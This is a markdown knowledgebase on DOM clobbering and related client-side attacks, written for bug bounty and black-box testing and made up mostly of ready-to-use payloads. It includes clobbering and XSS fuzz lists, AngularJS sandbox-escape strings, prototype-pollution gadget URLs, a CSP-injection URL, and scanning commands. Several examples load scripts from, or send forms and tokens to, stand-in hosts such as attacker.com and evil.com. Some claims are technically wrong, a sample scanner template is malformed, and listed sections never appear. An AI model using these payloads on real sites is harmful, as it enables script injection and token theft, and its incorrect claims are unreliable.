# DOM Clobbering — Complete Research-Grade Knowledgebase

> **Classification**: Client-Side Vulnerability | DOM-Based Attack Vector | XSS Enabler
> **Scope**: Bug Bounty, Black-Box Testing, Advanced Web Application Security
> **Version**: Research Compilation 2026
> **Sources**: PortSwigger Research, HackTricks, PayloadsAllTheThings, MDN Web APIs, BlackFan/PP-Gadgets, Tiny-XSS-Payloads, Nuclei Templates, ProjectDiscovery Toolkit

---

## Table of Contents

- [Basics](#basics)
- [DOM Clobbering Theory](#dom-clobbering-theory)
- [HTMLCollection Abuse](#htmlcollection-abuse)
- [NamedNodeMap Abuse](#namednodemap-abuse)
- [id/name Collision Payloads](#idname-collision-payloads)
- [iframe Clobbering](#iframe-clobbering)
- [form Clobbering](#form-clobbering)
- [DOM XSS Chains](#dom-xss-chains)
- [CSP Bypass Chains](#csp-bypass-chains)
- [Prototype Pollution + DOM Clobbering Chains](#prototype-pollution--dom-clobbering-chains)
- [postMessage + DOM Clobbering Chains](#postmessage--dom-clobbering-chains)
- [AngularJS Gadget Chains](#angularjs-gadget-chains)
- [Sandbox Escape Chains](#sandbox-escape-chains)
- [Client-Side Redirect Chains](#client-side-redirect-chains)
- [Token Leakage Techniques](#token-leakage-techniques)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is DOM Clobbering?

DOM Clobbering is a technique where an attacker injects HTML elements with specific `id` or `name` attributes to overwrite global JavaScript variables or object properties. When a web application references a variable that was never explicitly declared, the browser's DOM API may resolve it to a named DOM element instead, causing unexpected behavior and potential security vulnerabilities.

### Core Concept

Browsers automatically create global variables for elements with `id` or `name` attributes on the `window` object and `document` object. If JavaScript code references a variable expecting a specific type (e.g., a string, object, or function) but receives a DOM element instead, type confusion occurs. This can break application logic, bypass security controls, or enable XSS.

### Key Attack Surface

| Surface | Description |
|---------|-------------|
| `window[id]` | Elements with `id` become properties of `window` |
| `document[name]` | Named elements become properties of `document` |
| `HTMLCollection` | Multiple elements with same `name` create array-like collections |
| `NamedNodeMap` | Element attributes expose named access |
| `document.all` | Legacy IE behavior, still present in modern browsers |
| `document.getElementById()` | Can be shadowed by `<html>` or `<body>` tags with same `id` |

### Prerequisites for Exploitation

1. **HTML Injection**: The attacker must be able to inject arbitrary HTML into the page.
2. **Unsafe Variable Access**: The application must reference variables without proper declaration or validation.
3. **No Strict Mode**: `'use strict'` prevents some clobbering vectors, but not all.
4. **Sink Execution**: The clobbered value must reach a dangerous sink (e.g., `eval()`, `innerHTML`, `script.src`).

---

## DOM Clobbering Theory

### How Browsers Create Named Properties

When the HTML parser encounters an element with an `id` or `name` attribute, it:

1. Registers the element on `window[id]` (for `id` attributes)
2. Registers the element on `document[name]` (for `name` attributes on certain elements)
3. Creates `HTMLCollection` entries when multiple elements share the same `name`
4. Updates `document.all` (legacy, but still functional in quirks mode)

### The Named Property Tracker

```javascript
// Browser internal behavior (simplified)
// When parsing: <div id="foo">bar</div>
window.foo === document.getElementById('foo'); // true in many cases

// When parsing: <form name="login">
document.login === document.getElementsByName('login')[0]; // true
```

### Type Confusion Attack Model

```
Attacker injects: <a id="config" href="javascript:alert(1)">
Application does:  let url = config.endpoint || '/default';
Result:            url becomes <a> element, .href is read, JS scheme executes
```

### Clobbering Depth

| Depth | Target | Technique |
|-------|--------|-----------|
| 1 | `x` | `<a id=x>` |
| 2 | `x.y` | `<a id=x><a id=x name=y>` or `<form id=x><input name=y>` |
| 3 | `x.y.z` | `<form id=x name=y><input id=z></form><form id=x></form>` |
| 4+ | `a.b.c.d` | Nested iframes with `name` attributes |

---

## HTMLCollection Abuse

### Theory

`HTMLCollection` is a live, array-like collection of DOM elements. It exposes members as properties by **name** and **index**. When multiple elements share the same `name` attribute, `document[name]` or `form[name]` returns an `HTMLCollection` instead of a single element.

Key properties from MDN:
- `HTMLCollection.length` — number of items
- `HTMLCollection.item(index)` — element at index
- `HTMLCollection.namedItem(name)` — element by ID or name
- **Bracket notation**: `collection[i]` and `collection[name]` both work

### Abuse Vectors

```javascript
// If application expects a single element but gets collection:
let el = document.forms[0].elements['field'];
// If attacker injects two elements with name="field":
// el becomes HTMLCollection, not a single input

// Accessing .value on HTMLCollection:
// Chrome: undefined (safe-ish)
// Firefox: may throw or behave differently
```

### Clobbering forEach (Chrome Only)

```html
<!-- Payload -->
<form id=x>
  <input id=y name=z>
  <input id=y>
</form>

<!-- Sink -->
<script>
  x.y.forEach(element => alert(element));
  // x.y is HTMLCollection in Chrome
  // forEach works because HTMLCollection has Symbol.iterator in Chrome
</script>
```

### HTMLCollection Property Shadowing

```html
<!-- Create collection with named access -->
<a id=x name=foo href="http://evil.com">A</a>
<a id=x name=bar href="http://evil.com">B</a>

<script>
  // x is HTMLCollection
  x.foo.href === "http://evil.com"; // true
  x.bar.href === "http://evil.com"; // true
  x[0] === x.foo; // true
</script>
```

---

## NamedNodeMap Abuse

### Theory

`NamedNodeMap` represents a collection of `Attr` objects (attributes). It is **live** and auto-updates. While primarily used for `Element.attributes`, understanding it is crucial for advanced clobbering because:

- Attributes can be accessed by name: `element.attributes['href']`
- Numeric access works: `element.attributes[0]`
- The `.length` property exposes attribute count

### Abuse in Clobbering Context

```javascript
// If an application checks attributes naively:
let attrs = someElement.attributes;
for (let i = 0; i < attrs.length; i++) {
  if (attrs[i].name === 'src') {
    // Attacker can manipulate attribute order or inject attributes
  }
}
```

### Combined with id/name Collision

```html
<img id="attributes" src="x" onerror="alert(1)">
<script>
  // If code does: element.attributes
  // and an element with id="attributes" exists in scope
  // type confusion may occur
</script>
```

---

## id/name Collision Payloads

### Single-Level Clobbering

```html
<!-- Clobber window.foo -->
<a id=foo href="javascript:alert(1)">click</a>

<!-- Clobber document.bar -->
<form name=bar>
  <input name=baz value="clobbered">
</form>
```

### Two-Level Clobbering (x.y)

```html
<!-- Technique 1: Same id, different name -->
<a id=x><a id=x name=y href="Clobbered">

<!-- Sink -->
<script>alert(x.y)</script>

<!-- Technique 2: Form + named input -->
<form id=x>
  <input name=y value="Clobbered">
</form>

<!-- Sink -->
<script>alert(x.y.value)</script>
```

### Three-Level Clobbering (x.y.z)

```html
<!-- Payload -->
<form id=x name=y>
  <input id=z>
</form>
<form id=x></form>

<!-- Sink -->
<script>alert(x.y.z)</script>
```

### Four+ Level Clobbering (a.b.c.d)

```html
<!-- Payload: Nested iframe clobbering -->
<iframe name=a srcdoc="
  <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>
"></iframe>

<!-- Sink -->
<script>alert(a.b.c.d)</script>
```

### Clobbering document.getElementById()

```html
<!-- Shadow getElementById using <html> or <body> -->
<html id="cdnDomain">clobbered</html>

<!-- OR -->
<svg><body id=cdnDomain>clobbered</body></svg>

<!-- Sink -->
<script>
  alert(document.getElementById('cdnDomain').innerText); // "clobbered"
</script>
```

> **Note**: `document.getElementById()` prioritizes `<html>` and `<body>` tags over other elements when they have matching `id` attributes. This is a critical browser quirk.

### Clobbering URL Properties (username/password)

```html
<!-- Payload -->
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

<!-- Sink -->
<script>
  alert(x.username); // "Clobbered-username"
  alert(x.password); // "Clobbered-password"
</script>
```

### Firefox-Specific Clobbering

```html
<!-- Firefox only -->
<base href=a:abc><a id=x href="Firefox<>">

<!-- Sink -->
<script>
  alert(x); // "Firefox<>"
</script>
```

### Chrome-Specific Clobbering

```html
<!-- Chrome only -->
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

<!-- Sink -->
<script>
  alert(x.xyz); // "a://Clobbered<>"
</script>
```

---

## iframe Clobbering

### Basic iframe name Clobbering

```html
<!-- iframe name becomes window property -->
<iframe name="config" src="data:text/html,<script>parent.config={endpoint:'http://evil.com'}</script>"></iframe>

<!-- If application checks: if (typeof config === 'object') -->
<!-- The iframe content can inject properties -->
```

### srcdoc Clobbering Chains

```html
<!-- Nested iframe chain for deep clobbering -->
<iframe name="a" srcdoc="
  <iframe name='b' srcdoc='<a id=c name=d href=javascript:alert(1)>x</a>'>
"></iframe>

<script>
  // Access chain: a.b.c.d
  a.b.c.d.click(); // executes javascript:alert(1)
</script>
```

### iframe + postMessage Clobbering

```html
<!-- Attacker injects iframe that intercepts postMessages -->
<iframe name="apiFrame" src="https://attacker.com/interceptor.html"></iframe>

<script>
  // If application does:
  apiFrame.postMessage(data, '*');
  // Messages go to attacker instead of intended recipient
</script>
```

---

## form Clobbering

### Basic Form Property Clobbering

```html
<!-- Form with name becomes document property -->
<form name="settings">
  <input name="apiKey" value="attacker-controlled">
</form>

<script>
  // document.settings exists
  // document.settings.apiKey.value is attacker-controlled
  fetch('/api/' + document.settings.apiKey.value);
</script>
```

### Form Action Clobbering

```html
<!-- Override form action -->
<form name="login" action="https://attacker.com/phishing">
  <input name="username">
  <input name="password">
</form>

<!-- If JavaScript submits the form without setting action explicitly -->
<script>
  document.login.submit(); // submits to attacker.com
</script>
```

### Multiple Forms with Same Name (HTMLCollection)

```html
<form name="x">
  <input name="y" value="first">
</form>
<form name="x">
  <input name="y" value="second">
</form>

<script>
  // document.x is HTMLCollection
  document.x[0].y.value; // "first"
  document.x[1].y.value; // "second"
</script>
```

---

## DOM XSS Chains

### DOM Clobbering → innerHTML XSS

```html
<!-- Attacker injects: -->
<a id="container" href="javascript:alert(1)">

<!-- Application does: -->
<script>
  let html = container.innerHTML || '<div>default</div>';
  document.body.innerHTML = html;
  // If container is clobbered to <a>, innerHTML is undefined
  // But if application uses .href or other properties...
</script>
```

### DOM Clobbering → eval() XSS

```html
<!-- Attacker injects: -->
<div id="code">alert(1)</div>

<!-- Application does: -->
<script>
  let userCode = code.textContent || 'console.log("safe")';
  eval(userCode); // executes alert(1)
</script>
```

### DOM Clobbering → setTimeout/setInterval

```html
<!-- Attacker injects: -->
<a id="callback" href="javascript:alert(1)">

<!-- Application does: -->
<script>
  let cb = callback.href || 'function(){}';
  setTimeout(cb, 1000); // executes javascript:alert(1)
</script>
```

### DOM Clobbering → Function Constructor

```html
<!-- Attacker injects: -->
<div id="funcBody">alert(1)</div>

<!-- Application does: -->
<script>
  let body = funcBody.innerText || 'return 1';
  let fn = new Function(body);
  fn(); // executes alert(1)
</script>
```

### DOM Clobbering → JSON.parse (Prototype Pollution Bridge)

```html
<!-- Attacker controls input that gets parsed -->
<input id="jsonData" value='{"__proto__":{"isAdmin":true}}'>

<!-- Application does: -->
<script>
  let data = JSON.parse(jsonData.value);
  if (user.isAdmin) { /* grant admin access */ }
</script>
```

---

## CSP Bypass Chains

### Bypassing CSP via DOM Clobbering (Gareth Heyes, PortSwigger)

When CSP uses `strict-dynamic` or nonce-based policies, DOM Clobbering can inject elements that bypass the policy by leveraging existing trusted scripts.

#### Technique 1: Clobbering script src

```html
<!-- If a trusted script does: -->
<script nonce="abc123">
  let src = trustedSrc || '/default.js';
  importScripts(src); // or dynamic import
</script>

<!-- Attacker injects before the script: -->
<a id="trustedSrc" href="https://attacker.com/evil.js">
```

#### Technique 2: Meta tag CSP injection

```html
<!-- Attacker injects meta tag to override CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src * 'unsafe-inline'">

<!-- Must be injected before the real CSP meta tag or header -->
```

#### Technique 3: Base tag + relative script

```html
<!-- Change base URL for relative scripts -->
<base href="https://attacker.com/">

<!-- Trusted script loads: -->
<script src="/app.js"></script>
<!-- Actually loads https://attacker.com/app.js -->
```

### CSP Policy Injection (PayPal Case Study)

When a `report-uri` or other CSP directive includes attacker-controllable parameters:

```
https://victim.com/page?token=SOMETOKEN;_
```

**Edge behavior**: Invalid directive (`;_`) causes entire policy drop.

**Chrome behavior**: Use `script-src-elem` to override existing `script-src`:

```
https://victim.com/page?token=;script-src-elem%20'unsafe-inline'
```

### Nonce-Based CSP Bypass via Gadgets

```html
<!-- Attacker injects before legitimate element: -->
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />

<!-- Trusted script does: -->
<script nonce="random">
  let t = document.querySelector("[id^='RecaptchaClientUrl-']").value;
  let n = document.createElement("script");
  n.src = t;
  document.head.appendChild(n);
</script>
```

> **Key insight**: `querySelector` returns the **first** match. If attacker injects an element with a matching ID prefix before the legitimate element, the attacker's value is used.

---

## Prototype Pollution + DOM Clobbering Chains

### Theory

Prototype Pollution (PP) allows modifying `Object.prototype`, affecting all objects. When combined with DOM Clobbering, PP can:

1. Modify how DOM APIs behave
2. Inject properties that scripts expect to be safe
3. Bypass sanitizers by polluting their configuration objects

### PP → DOM Clobbering Bridge

```javascript
// Step 1: Pollute Object.prototype via URL parameter
// ?__proto__[innerHTML]=<img/src/onerror=alert(1)>

// Step 2: When application creates an element:
let div = document.createElement('div');
div.innerHTML = "safe"; // Actually executes polluted value
```

### Common PP Gadgets (from BlackFan's research)

| Library | Payload | Effect |
|---------|---------|--------|
| jQuery `$.get` | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script` | XSS |
| jQuery `$.getScript` | `?__proto__[src][]=data:,alert(1)//` | XSS |
| jQuery `$(html)` | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>` | XSS |
| DOMPurify ≤2.0.12 | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` | Bypass |
| Google Closure | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1` | XSS |
| Vue.js | `?__proto__[v-if]=_c.constructor('alert(1)')()` | XSS |
| Google Analytics | `?__proto__[cookieName]=COOKIE=Injection;` | Cookie Injection |

### PP + DOM Clobbering Chain Example

```html
<!-- Attacker injects: -->
<script>
  // Pollute via prototype
  Object.prototype.endpoint = 'https://attacker.com/api';
</script>

<!-- AND clobbers: -->
<a id="config" href="https://attacker.com/api">

<!-- Application does: -->
<script>
  let cfg = window.config || {};
  let url = cfg.endpoint || '/default';
  // If config is clobbered to <a>, cfg.endpoint is undefined
  // Falls through to Object.prototype.endpoint!
  fetch(url); // sends data to attacker
</script>
```

---

## postMessage + DOM Clobbering Chains

### Theory

`postMessage` is used for cross-origin communication. DOM Clobbering can:

1. Change the `targetOrigin` by clobbering the origin variable
2. Modify the message payload structure
3. Hijack the message recipient by clobbering `window` references

### Clobbering postMessage Target

```html
<!-- Attacker injects: -->
<iframe name="partnerWindow" src="https://attacker.com/receiver.html"></iframe>

<!-- Application does: -->
<script>
  partnerWindow.postMessage(secretData, 'https://partner.com');
  // partnerWindow is now attacker's iframe!
</script>
```

### Clobbering Origin Check

```html
<!-- Attacker injects: -->
<a id="allowedOrigin" href="https://attacker.com">

<!-- Application does: -->
<script>
  window.addEventListener('message', e => {
    if (e.origin === allowedOrigin) { // allowedOrigin is clobbered!
      processMessage(e.data);
    }
  });
</script>
```

---

## AngularJS Gadget Chains

### AngularJS Template Injection (CSTI)

AngularJS processes expressions inside `{{ }}` even when HTML-encoded. Combined with sandbox escapes, this becomes XSS.

#### Basic CSTI

```html
<!-- Even with htmlspecialchars(): -->
<p>{{7*7}}</p>
<!-- Renders as: 49 -->
```

#### Sandbox Escape Payloads (Version-Specific)

```javascript
// Angular 1.0.1 - 1.1.5
{{constructor.constructor('alert(1)')()}}

// Angular 1.2.0 - 1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.2.24 - 1.2.29
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+"'");}}

// Angular 1.3.1 - 1.3.2
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}

// Angular 1.3.3 - 1.3.18
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//');}}

// Angular 1.4.0 - 1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// Angular 1.5.0 - 1.5.8
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// Angular >= 1.6.0 (sandbox removed)
{{constructor.constructor('alert(1)')()}}
```

### AngularJS + DOM Clobbering

```html
<!-- Attacker clobbers Angular config -->
<a id="angular" href="https://attacker.com/malicious-angular.js">

<!-- If application dynamically loads Angular -->
<script>
  let angularUrl = window.angular || 'https://cdn.angularjs.org/angular.js';
  // angular is clobbered to <a>, angular.href is used
</script>
```

---

## Sandbox Escape Chains

### Browser Sandbox Escapes via DOM Clobbering

While true browser sandbox escapes are rare, DOM Clobbering can enable:

1. **Same-Origin Policy bypass** via `document.domain` clobbering
2. **CSP bypass** via policy injection (see CSP section)
3. **iframe sandbox bypass** via `allow-same-origin` + clobbering

### iframe sandbox + DOM Clobbering

```html
<!-- Sandboxed iframe with allow-same-origin -->
<iframe sandbox="allow-scripts allow-same-origin" src="...">

<!-- Inside iframe, attacker clobbers parent reference -->
<script>
  // If parent has: let data = childWindow.result;
  // Child can clobber: window.result = { sensitive: 'data' };
</script>
```

---

## Client-Side Redirect Chains

### Clobbering Redirect Targets

```html
<!-- Attacker injects: -->
<a id="redirectUrl" href="https://attacker.com/phishing">

<!-- Application does: -->
<script>
  let url = redirectUrl || '/dashboard';
  location.href = url; // redirects to attacker
</script>
```

### Clobbering OAuth Redirect URI

```html
<!-- Attacker injects: -->
<form name="oauth">
  <input name="redirect_uri" value="https://attacker.com/callback">
</form>

<!-- Application does: -->
<script>
  let uri = oauth.redirect_uri.value || '/callback';
  // uri is attacker-controlled
</script>
```

### Meta Refresh Clobbering

```html
<!-- Attacker injects meta refresh -->
<meta http-equiv="refresh" content="0;url=https://attacker.com">

<!-- OR clobbers the delay variable -->
<a id="delay" href="0;url=https://attacker.com">
```

---

## Token Leakage Techniques

### Clobbering Token Storage

```html
<!-- Attacker injects: -->
<form name="auth">
  <input name="token" value="leaked-to-attacker">
</form>

<!-- Application reads token from DOM instead of secure storage -->
<script>
  let token = auth.token.value;
  // token is now attacker-controlled, but also:
  // If application sends this token somewhere, it leaks
</script>
```

### Clobbering API Keys

```html
<!-- Attacker injects: -->
<div id="apiKey">attacker-controlled-key</div>

<!-- Application does: -->
<script>
  let key = apiKey.innerText || 'default-key';
  fetch('https://api.service.com/data?key=' + key);
  // Key is sent to API, but if apiKey is clobbered,
  // the request might go to a different endpoint
</script>
```

### Clobbering postMessage Tokens

```html
<!-- Attacker injects iframe to intercept tokens -->
<iframe name="tokenFrame" src="https://attacker.com/interceptor.html"></iframe>

<!-- Application sends token via postMessage -->
<script>
  tokenFrame.postMessage({ token: secretToken }, '*');
</script>
```

---

## Browser Quirks

### HTMLCollection vs NodeList

| Feature | HTMLCollection | NodeList |
|---------|---------------|----------|
| Live | Yes | `NodeList` is static; `childNodes` is live |
| Named access | Yes (by `id` and `name`) | No |
| `namedItem()` | Yes | No |
| Array methods | Limited (Chrome has `forEach`) | Limited |

### getElementById Shadowing

```javascript
// document.getElementById() is shadowed by <html> and <body> tags
// with matching id attributes in all modern browsers

<html id="test">test</html>
<script>
  document.getElementById('test').tagName; // "HTML", not the actual element
</script>
```

### Firefox Quirks

- `<base>` tag affects `href` resolution in unexpected ways
- `name` attribute on `<a>` creates stronger properties than in Chrome
- `document.all` is falsy but functional

### Chrome Quirks

- `HTMLCollection` has `Symbol.iterator`, supports `forEach`
- `id` attributes on `<html>` and `<body>` shadow `getElementById`
- Named properties on `window` are enumerable in some versions

### Safari Quirks

- Stricter CSP enforcement in some contexts
- `document.all` behavior differs from Chrome/Firefox
- iframe `srcdoc` parsing quirks

### Edge (Legacy) Quirks

- CSP policy completely drops on invalid directive (not just ignores)
- `document.all` is more extensively used internally
- `XMLHttpRequest` response handling differences

---

## Gadget Chains

### Script Gadgets

Script gadgets are existing JavaScript functionality that can be repurposed for attacks. Common gadget categories:

#### jQuery Gadgets

```javascript
// jQuery $(html) gadget
// Attacker pollutes: Object.prototype.div = [1, '<img/src/onerror=alert(1)>']
// jQuery does: $('<div>') → checks Object.prototype.div

// jQuery $.getScript gadget
// Attacker pollutes: Object.prototype.src = 'data:,alert(1)//'
// jQuery does: $.getScript('/script.js') → uses polluted src
```

#### DOMPurify Gadgets

```javascript
// DOMPurify config pollution
// ?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
// DOMPurify allows onerror and src attributes
```

#### Google Closure Gadgets

```javascript
// Google Closure base path pollution
// ?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
// Closure loads scripts from polluted path
```

### DOM Clobbering Gadgets

```javascript
// Gadget: document.querySelector with prefix match
// Attacker injects: <input id="RecaptchaClientUrl-" value="//evil.com/xss.js">
// Code does: document.querySelector("[id^='RecaptchaClientUrl-']").value

// Gadget: form element access
// Attacker injects: <form name="config"><input name="apiUrl" value="//evil.com"></form>
// Code does: document.config.apiUrl.value

// Gadget: window[id] fallback
// Attacker injects: <a id="jQuery" href="//evil.com/jquery.js">
// Code does: if (typeof jQuery === 'undefined') loadScript('/jquery.js');
// jQuery is clobbered to <a>, typeof is 'object', not 'undefined'
```

---

## Real World Case Studies

### Case Study 1: PayPal CSP Policy Injection (Gareth Heyes)

**Vulnerability**: PayPal placed a user-controllable `token` parameter inside the `report-uri` CSP directive.

**Exploitation**:
```
https://www.paypal.com/webapps/xoonboarding?token=SOMETOKEN;_
```

**Edge**: `;_` invalidates entire CSP → policy dropped completely.

**Chrome**: Inject `script-src-elem` to override `script-src`:
```
?token=;script-src-elem%20'unsafe-inline'
```

**Impact**: CSP bypass enabling XSS on PayPal.

**Bounty**: $900

### Case Study 2: PortSwigger Nonce-Based CSP Bypass

**Vulnerability**: Recaptcha script used `querySelector` with ID prefix match.

**Code**:
```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value
  , i = document.querySelector("[id^='RecaptchaClientSecret-']").value
  , n = document.createElement("script");
n.id = "RecaptchaScript";
n.src = t + i;
```

**Exploitation**:
```html
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />
```

**Impact**: Attacker-controlled script loaded despite nonce-based CSP.

**Root Cause**: `querySelector` returns first match; attacker injects matching element before legitimate one.

### Case Study 3: DOM Clobbering to XSS (PortSwigger Academy)

**Scenario**: Application uses `window.config` for settings.

**Attacker payload**:
```html
<a id="config" href="javascript:alert(1)">
```

**Application code**:
```javascript
let url = config.endpoint || '/default';
// config is clobbered to <a>, config.endpoint is undefined
// But if code does: config.href → "javascript:alert(1)"
```

### Case Study 4: AngularJS Sandbox Escape → CSTI → XSS

**Vulnerability**: AngularJS expression injection with sandbox escape.

**Payload** (Angular 1.4):
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Impact**: Arbitrary JavaScript execution on sites using AngularJS, even with HTML encoding.

---

## Fuzzing Payloads

### DOM Clobbering Fuzz List

```html
<!-- Single element clobbering -->
<a id=FUZZ href=javascript:alert(1)>
<form name=FUZZ><input name=FUZZ value=clobbered>
<div id=FUZZ>clobbered</div>
<span id=FUZZ>clobbered</span>
<img id=FUZZ src=x onerror=alert(1)>
<iframe id=FUZZ src=javascript:alert(1)>

<!-- Two-level clobbering -->
<a id=FUZZ><a id=FUZZ name=FUZZ href=javascript:alert(1)>
<form id=FUZZ><input name=FUZZ value=clobbered>

<!-- Three-level clobbering -->
<form id=FUZZ name=FUZZ><input id=FUZZ></form><form id=FUZZ></form>

<!-- getElementById shadowing -->
<html id=FUZZ>clobbered</html>
<svg><body id=FUZZ>clobbered</body></svg>

<!-- Collection clobbering -->
<form id=FUZZ><input id=FUZZ name=FUZZ><input id=FUZZ></form>

<!-- URL property clobbering -->
<a id=FUZZ href="ftp:username:password@host">

<!-- iframe clobbering -->
<iframe name=FUZZ srcdoc="<script>parent.FUZZ='clobbered'</script>"></iframe>
```

### XSS Context Fuzzing

```html
<!-- Attribute context -->
" onclick="alert(1)">
' onmouseover='alert(1)'>
` onfocus=alert(1) autofocus>

<!-- JavaScript context -->
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>

<!-- Template context (Angular) -->
{{7*7}}
{{constructor.constructor('alert(1)')()}}

<!-- URL context -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Tiny XSS Payloads (terjanq)

```html
<!-- Base href + relative script -->
<base/href=//Ǌ.₨>

<!-- SVG onload with eval(name) -->
<svg/onload=eval(name)>

<!-- URL-controlled -->
<svg/onload=eval(`'`+URL)>

<!-- innerHTML-safe -->
<svg><svg/onload=eval(name)>

<!-- Audio onerror -->
<audio/src/onerror=eval(name)>

<!-- iframe onload with top.name -->
<iframe/onload=src=top.name>

<!-- import() based (Chrome, HTTPS) -->
<svg/onload=import(/\Ǌ.₨/)>
```

---

## Automation Workflows

### Manual Testing Workflow

```
1. Identify HTML injection points (search, comments, profiles, etc.)
2. Check if injected HTML persists in DOM (not just reflected)
3. Review JavaScript source for:
   - Undeclared variable usage
   - document.getElementById() without null checks
   - window[variable] access
   - Form element access via name
   - querySelector with prefix/suffix matches
4. Inject clobbering payloads and observe behavior
5. Chain clobbering to reach dangerous sinks
6. Verify bypass of security controls (CSP, sanitizers)
```

### Automated Scanner Integration

```bash
# Step 1: Crawl with katana
katana -u https://target.com -o urls.txt

# Step 2: Probe for DOM XSS sinks
httpx -l urls.txt -mc 200 -o live_urls.txt

# Step 3: Run nuclei DOM XSS templates
nuclei -l live_urls.txt -t http/vulnerabilities/dom-xss/ -o dom_xss.txt

# Step 4: Check for prototype pollution
# Use pp-finder on JavaScript bundles
pp-finder run -c ./ppfinder.json -- node target_app.js

# Step 5: Burp Suite + DOM Invader
# Enable DOM Invader extension
# Use "Clobbering" tab to test named property creation
```

### Continuous Monitoring

```bash
# Monitor for new endpoints
subfinder -d target.com | httpx | nuclei -t http/vulnerabilities/

# Check for CSP changes
# Store baseline CSP headers, alert on changes
for url in $(cat urls.txt); do
  curl -s -I "$url" | grep -i "content-security-policy" >> csp_baseline.txt
done
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# Subdomain enumeration
subfinder -d target.com -all -o subs.txt

# URL discovery
katana -list subs.txt -o urls.txt
waybackurls target.com >> urls.txt
gau target.com >> urls.txt

# JavaScript file extraction
katana -list subs.txt -jc -o js_urls.txt
```

### Phase 2: JavaScript Analysis

```bash
# Download and analyze JS
mkdir js_analysis
cat js_urls.txt | xargs -I{} curl -s {} -o js_analysis/$(basename {})

# Search for dangerous patterns
grep -r "getElementById\|querySelector\|window\[" js_analysis/
grep -r "document\.\w\+\.value\|innerHTML\|eval\|Function" js_analysis/

# Check for prototype pollution sinks
grep -r "Object\.assign\|_.merge\|$.extend" js_analysis/
```

### Phase 3: HTML Injection Points

```bash
# Identify potential injection points
# - URL parameters reflected in page
# - DOM-based sinks (location.hash, postMessage)
# - User input fields without output encoding

# Test with basic HTML
# ?q=<b>test</b>
# Check if bold text renders
```

### Phase 4: Clobbering Testing

```bash
# Inject test clobbering payloads
# ?q=<a id="testClobber" href="x">
# Then check in console: window.testClobber

# Test for collection creation
# ?q=<a name="testColl"><a name="testColl">
# Check: document.testColl (should be HTMLCollection)
```

### Phase 5: Sink Identification

```javascript
// Look for these patterns in JS:
let x = someVariable; // undeclared variable
let y = document.getElementById('id'); // without null check
let z = formName.inputName.value; // form access
let w = window['dynamic' + 'Name']; // dynamic property access
```

---

## Nuclei Templates

### DOM XSS Detection Template Logic

```yaml
# Example nuclei template structure for DOM clobbering detection
id: dom-clobbering-test

info:
  name: DOM Clobbering Test
  author: researcher
  severity: medium
  description: Tests for DOM clobbering vulnerability

dna:
  - part: query
    type: word
    words:
      - "<a id=test href=x>"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<a%20id=test%20href=x>"

    matchers:
      - type: word
        part: body
        words:
          - "<a id="test""
```

### Prototype Pollution Detection

```yaml
id: prototype-pollution-check

info:
  name: Prototype Pollution Parameter Check
  author: researcher
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?__proto__[test]=polluted"
      - "{{BaseURL}}/?constructor[prototype][test]=polluted"

    matchers:
      - type: word
        part: body
        words:
          - "polluted"
```

### CSP Bypass Detection

```yaml
id: csp-policy-injection

info:
  name: CSP Policy Injection Check
  author: researcher
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?token=;script-src-elem%20'unsafe-inline'"

    matchers:
      - type: word
        part: header
        words:
          - "script-src-elem"
```

### Running Nuclei Templates

```bash
# Run all vulnerability templates
nuclei -u https://target.com -t http/vulnerabilities/

# Run specific DOM XSS templates
nuclei -u https://target.com -t http/vulnerabilities/dom-xss/

# Run with custom templates
nuclei -u https://target.com -t custom-templates/

# Output to file
nuclei -l urls.txt -t http/vulnerabilities/ -o nuclei_results.txt
```

---

## Tools and Scanners

### DOM Clobbering Specific Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **DOM Invader** | Burp Suite extension for DOM vulnerability detection | https://github.com/PortSwigger/dom-invader |
| **DOMClobbering** | Comprehensive payload list for mobile/desktop | https://github.com/SoheilKhodayari/DOMClobbering |
| **Dom-Explorer** | Test HTML parsers and sanitizers | https://github.com/yeswehack/Dom-Explorer |
